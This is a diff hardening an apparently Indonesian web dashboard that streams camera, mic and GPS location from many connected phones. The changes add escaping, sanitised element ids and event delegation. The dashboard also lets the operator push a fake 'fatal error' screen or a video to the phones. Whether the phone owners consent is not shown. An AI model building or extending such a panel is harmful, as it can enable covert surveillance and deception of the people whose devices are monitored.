@@ -237,6 +237,21 @@
     let modalTargetId = null;
     let modalMode = "error";
 
+    function domKey(id) {
+      return String(id || "").replace(/[^a-zA-Z0-9_-]/g, "_");
+    }
+
+    function escapeHtml(str) {
+      if (!str) return "";
+      return String(str).replace(/[&<>"']/g, (ch) => ({
+        "&": "&amp;", "<": "&lt;", ">": "&gt;", "\"": "&quot;", "'": "&#39;"
+      }[ch]));
+    }
+
+    function escapeAttr(str) {
+      return escapeHtml(str).replace(/`/g, "&#96;");
+    }
+
     function isUnlocked() {
       return sessionStorage.getItem(AUTH_STORAGE_KEY) === "1";
     }
@@ -285,9 +300,9 @@
       }
       if (peer && !peer.destroyed && peer.open) {
         const tempConn = peer.connect(id, { reliable: true });
-        entry.conn = tempConn;
+        bindMemberDataChannel(tempConn);
         tempConn.on("open", () => {
-          tempConn.send(payload);
+          try { tempConn.send(payload); } catch (_) {}
         });
         return true;
       }
@@ -299,12 +314,15 @@
         for (const id of Object.keys(devices)) {
           sendPayloadToDevice(id, payload);
         }
-      } else if (targetId) {
+      } else if (targetId && devices[targetId]) {
         sendPayloadToDevice(targetId, payload);
       }
     }
 
     function openPushModal(targetId, mode) {
+      if (targetId !== "ALL" && !devices[targetId]) {
+        return;
+      }
       modalTargetId = targetId;
       modalMode = mode;
 
@@ -316,7 +334,7 @@
 
       targetLabel.textContent = targetId === "ALL"
         ? `Target: Semua HP (${Object.keys(devices).length} perangkat)`
-        : `Target: ${formatDisplayDeviceTitle(devices[targetId] || { peerId: targetId })}`;
+        : `Target: ${formatDisplayDeviceTitle(devices[targetId])}`;
 
       if (mode === "error") {
         heading.textContent = "⚠️ Kirim Layar Error";
@@ -341,7 +359,8 @@
     }
 
     function submitPushModal() {
-      if (!modalTargetId) return;
+      const currentTarget = modalTargetId;
+      if (!currentTarget) return;
       if (modalMode === "error") {
         const payload = {
           type: "SHOW_ERROR_SCREEN",
@@ -350,7 +369,7 @@
           message: document.getElementById("errMsgInput").value.trim() || "Terjadi kesalahan fatal pada sesi perangkat.",
           withSound: false
         };
-        sendPayloadToTargets(modalTargetId, payload);
+        sendPayloadToTargets(currentTarget, payload);
       } else {
         const payload = {
           type: "PLAY_MEMBER_VIDEO",
@@ -359,7 +378,7 @@
           loop: Boolean(document.getElementById("vidLoopCheck").checked),
           muted: Boolean(document.getElementById("vidMutedCheck").checked)
         };
-        sendPayloadToTargets(modalTargetId, payload);
+        sendPayloadToTargets(currentTarget, payload);
       }
       closePushModal();
     }
@@ -632,7 +651,7 @@
     function applyCardAudioMute(id, muted) {
       const entry = devices[id];
       if (entry) entry.audioMuted = Boolean(muted);
-      const vid = document.getElementById(`vid_${id}`);
+      const vid = document.getElementById(`vid_${domKey(id)}`);
       if (vid) {
         vid.muted = Boolean(muted);
         vid.volume = muted ? 0 : 1;
@@ -689,9 +708,10 @@
     }
 
     function attachStreamToCard(id, stream) {
+      const key = domKey(id);
       const entry = devices[id];
-      const vid = document.getElementById(`vid_${id}`);
-      const ph = document.getElementById(`ph_${id}`);
+      const vid = document.getElementById(`vid_${key}`);
+      const ph = document.getElementById(`ph_${key}`);
       if (!vid || !ph) return;
 
       if (stream && stream.active) {
@@ -711,70 +731,87 @@
       }
     }
 
-    function escapeHtml(str) {
-      if (!str) return "";
-      return String(str).replace(/[&<>"']/g, (ch) => ({
-        "&": "&amp;", "<": "&lt;", ">": "&gt;", "\"": "&quot;", "'": "&#39;"
-      }[ch]));
-    }
-
     function createCardElement(d) {
-      const safeId = escapeHtml(d.peerId);
+      const key = domKey(d.peerId);
+      const attrId = escapeAttr(d.peerId);
       const card = document.createElement("div");
       card.className = "device-card";
-      card.id = `card_${d.peerId}`;
+      card.id = `card_${key}`;
+      card.dataset.peerId = d.peerId;
       card.innerHTML = `
         <div class="video-wrap">
           <div class="chip-row">
-            <span class="chip" id="status_${safeId}">Menunggu</span>
-            <span class="chip" id="badge_${safeId}">${escapeHtml((d.hpBrand || "HP").toUpperCase())} • ${escapeHtml(d.peerId.slice(-4))}</span>
+            <span class="chip" id="status_${key}">Menunggu</span>
+            <span class="chip" id="badge_${key}">${escapeHtml((d.hpBrand || "HP").toUpperCase())} • ${escapeHtml(d.peerId.slice(-4))}</span>
           </div>
-          <video id="vid_${safeId}" autoplay playsinline muted style="display:none;"></video>
-          <div id="ph_${safeId}" class="video-placeholder">
+          <video id="vid_${key}" autoplay playsinline muted style="display:none;"></video>
+          <div id="ph_${key}" class="video-placeholder">
             Kamera tidak aktif / menunggu stream...
           </div>
         </div>
         <div class="card-body">
-          <div class="device-id" id="title_${safeId}">${escapeHtml(formatDisplayDeviceTitle(d))}</div>
-          <div class="meta-line" id="streamDiag_${safeId}">🎥 Stream: Menunggu • 🎙️ Mic: Mengecek</div>
-          <div class="area-line" id="area_${safeId}">🗺️ Daerah: Mendeteksi lokasi...</div>
-          <div class="meta-line" id="loc_${safeId}">📍 Menunggu koordinat...</div>
-          <div class="meta-line" id="dev_${safeId}">📱 Perangkat</div>
-          <div class="card-actions" id="act_${safeId}">
-            <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'user')">Depan</button>
-            <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'environment')">Belakang</button>
-            <button class="btn-emerald btn-sm" onclick="requestMicForDevice('${safeId}')">🎙️ Minta Mic</button>
-            <button class="btn-amber btn-sm" id="btnAudio_${safeId}" onclick="toggleDeviceAudioMute('${safeId}')">🔇 Unmute</button>
-            <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}', true)">▶ Putar / Stream</button>
-            <button class="btn-rose btn-sm" onclick="openPushModal('${safeId}', 'error')">⚠️ Layar Error</button>
-            <button class="btn-purple btn-sm" onclick="openPushModal('${safeId}', 'video')">🎬 Kirim Video</button>
-            <button class="btn-slate btn-sm" onclick="hideOverlayForDevice('${safeId}')">✕ Tutup Overlay</button>
+          <div class="device-id" id="title_${key}">${escapeHtml(formatDisplayDeviceTitle(d))}</div>
+          <div class="meta-line" id="streamDiag_${key}">🎥 Stream: Menunggu • 🎙️ Mic: Mengecek</div>
+          <div class="area-line" id="area_${key}">🗺️ Daerah: Mendeteksi lokasi...</div>
+          <div class="meta-line" id="loc_${key}">📍 Menunggu koordinat...</div>
+          <div class="meta-line" id="dev_${key}">📱 Perangkat</div>
+          <div class="card-actions" id="act_${key}">
+            <button type="button" class="btn-indigo btn-sm" data-action="cam-user" data-peer-id="${attrId}">Depan</button>
+            <button type="button" class="btn-indigo btn-sm" data-action="cam-env" data-peer-id="${attrId}">Belakang</button>
+            <button type="button" class="btn-emerald btn-sm" data-action="mic" data-peer-id="${attrId}">🎙️ Minta Mic</button>
+            <button type="button" class="btn-amber btn-sm" id="btnAudio_${key}" data-action="mute" data-peer-id="${attrId}">🔇 Unmute</button>
+            <button type="button" class="btn-blue btn-sm" data-action="stream" data-peer-id="${attrId}">▶ Putar / Stream</button>
+            <button type="button" class="btn-rose btn-sm" data-action="modal-error" data-peer-id="${attrId}">⚠️ Layar Error</button>
+            <button type="button" class="btn-purple btn-sm" data-action="modal-video" data-peer-id="${attrId}">🎬 Kirim Video</button>
+            <button type="button" class="btn-slate btn-sm" data-action="hide-overlay" data-peer-id="${attrId}">✕ Tutup Overlay</button>
           </div>
         </div>
       `;
       return card;
     }
 
+    document.addEventListener("click", (e) => {
+      const btn = e.target.closest("button[data-action][data-peer-id]");
+      if (!btn) return;
+      const peerId = btn.getAttribute("data-peer-id");
+      const action = btn.getAttribute("data-action");
+      if (!peerId || !devices[peerId]) return;
+
+      if (action === "cam-user") switchDeviceCamera(peerId, "user");
+      else if (action === "cam-env") switchDeviceCamera(peerId, "environment");
+      else if (action === "mic") requestMicForDevice(peerId);
+      else if (action === "mute") toggleDeviceAudioMute(peerId);
+      else if (action === "stream") requestStreamFromDevice(peerId, true);
+      else if (action === "modal-error") openPushModal(peerId, "error");
+      else if (action === "modal-video") openPushModal(peerId, "video");
+      else if (action === "hide-overlay") hideOverlayForDevice(peerId);
+    });
+
     function syncDeviceCard(id) {
       const d = devices[id];
       if (!d) return;
 
+      const key = domKey(id);
       const emptyBox = document.getElementById("emptyBox");
       if (emptyBox) emptyBox.remove();
 
       const grid = document.getElementById("devicesGrid");
-      let card = document.getElementById(`card_${id}`);
+      let card = document.getElementById(`card_${key}`);
       if (!card) {
         card = createCardElement(d);
         grid.appendChild(card);
       }
 
-      const titleEl = document.getElementById(`title_${id}`);
+      const titleEl = document.getElementById(`title_${key}`);
       if (titleEl) {
         titleEl.textContent = formatDisplayDeviceTitle(d);
       }
 
-      const badgeEl = document.getElementById(`badge_${id}`);
+      if (modalTargetId === id && !document.getElementById("pushModal").classList.contains("hidden")) {
+        document.getElementById("modalTargetLabel").textContent = `Target: ${formatDisplayDeviceTitle(d)}`;
+      }
+
+      const badgeEl = document.getElementById(`badge_${key}`);
       if (badgeEl) {
         badgeEl.textContent = `${(d.hpBrand || "HP").toUpperCase()} • ${d.peerId.slice(-4)}`;
       }
@@ -785,8 +822,8 @@
       const hasLiveStream = Boolean(d.stream && d.stream.active);
       const hasAudioTrack = Boolean(d.stream && d.stream.getAudioTracks().some((t) => t.readyState === "live"));
 
-      const statusChip = document.getElementById(`status_${id}`);
-      const ph = document.getElementById(`ph_${id}`);
+      const statusChip = document.getElementById(`status_${key}`);
+      const ph = document.getElementById(`ph_${key}`);
 
       if (!withinGrace) {
         if (d.stream) {
@@ -818,8 +855,8 @@
         }
       }
 
-      const diagEl = document.getElementById(`streamDiag_${id}`);
-      const btnAudio = document.getElementById(`btnAudio_${id}`);
+      const diagEl = document.getElementById(`streamDiag_${key}`);
+      const btnAudio = document.getElementById(`btnAudio_${key}`);
       if (diagEl) {
         const vidState = hasLiveStream ? "Masuk" : "Standby";
         const micState = (d.micOn || hasAudioTrack) ? "Aktif" : "Tidak Ada";
@@ -832,8 +869,8 @@
 
       const loc = d.location;
       const hasCoords = loc && typeof loc.lat === "number" && typeof loc.lng === "number";
-      const areaEl = document.getElementById(`area_${id}`);
-      const locEl = document.getElementById(`loc_${id}`);
+      const areaEl = document.getElementById(`area_${key}`);
+      const locEl = document.getElementById(`loc_${key}`);
 
       if (areaEl) {
         areaEl.textContent = hasCoords
@@ -848,12 +885,12 @@
           : "📍 Menunggu koordinat dari HP member...";
       }
 
-      const devEl = document.getElementById(`dev_${id}`);
+      const devEl = document.getElementById(`dev_${key}`);
       if (devEl) {
         devEl.textContent = `📱 ${d.device || "Perangkat"}`;
       }
 
-      const actEl = document.getElementById(`act_${id}`);
+      const actEl = document.getElementById(`act_${key}`);
       if (actEl) {
         let mapLink = actEl.querySelector(".map-link");
         if (hasCoords) {
